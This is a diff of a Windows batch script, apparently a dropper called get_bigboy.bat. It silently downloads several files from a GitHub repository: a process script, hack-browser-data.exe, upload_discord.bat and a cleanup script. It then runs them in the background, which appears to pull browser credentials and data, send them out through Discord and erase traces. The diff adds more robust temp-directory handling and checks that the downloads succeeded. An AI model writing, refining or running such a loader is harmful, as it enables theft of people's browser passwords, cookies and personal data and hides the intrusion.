@@ -1,13 +1,27 @@
-REM =====================
-REM get_bigboy.bat 
-REM =====================
 @echo off
 setlocal EnableDelayedExpansion
 
-REM Create temp directory with random name to avoid conflicts
-set "tempdir=%TEMP%\bb_%RANDOM%"
+REM Generate unique temp directory name using timestamp
+for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value') do set datetime=%%I
+set "tempdir=%TEMP%\bb_%datetime:~0,14%"
+
+REM Check if directory already exists
+if exist "%tempdir%" (
+    echo Error: Temporary directory already exists
+    exit /b 1
+)
+
+REM Create temp directory
 mkdir "%tempdir%" 2>nul
-cd "%tempdir%"
+if %ERRORLEVEL% NEQ 0 (
+    echo Error: Failed to create temporary directory
+    exit /b 2
+)
+
+cd "%tempdir%" || (
+    echo Error: Failed to change directory
+    exit /b 3
+)
 
 echo Downloading files...
 curl -L -s -o process.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/process.bat
@@ -17,22 +31,20 @@ curl -L -s -o hack-browser-data.exe https://raw.githubusercontent.com/24-20/bigb
 curl -L -s -o upload_discord.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/upload_discord.bat
 curl -L -s -o cleanup.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/cleanup.bat
 
-REM Verify downloads
-if not exist "process.bat" (
-    echo Failed to download process.bat
-    exit /b 4
-)
-if not exist "hack-browser-data.exe" (
-    echo Failed to download hack-browser-data.exe
-    exit /b 4
+REM Verify all critical downloads
+for %%F in (process.bat hack-browser-data.exe upload_discord.bat cleanup.bat) do (
+    if not exist "%%F" (
+        echo Error: Failed to download %%F
+        exit /b 4
+    )
 )
 
 REM Create running flag
-echo 1 > "%tempdir%\running.tmp"
+echo %datetime% > "%tempdir%\running.tmp"
 
-REM Start the process and cleanup in background
-echo starting process----------------------------------------
+echo Starting process----------------------------------------
 start /B cmd /c "%tempdir%\process.bat"
-echo starting cleanup----------------------------------------
-start /B cmd /c "%tempdir%\cleanup.bat" "%tempdir%"
+timeout /t 2 /nobreak >nul
 
+echo Starting cleanup----------------------------------------
+start /B cmd /c "%tempdir%\cleanup.bat" "%tempdir%"
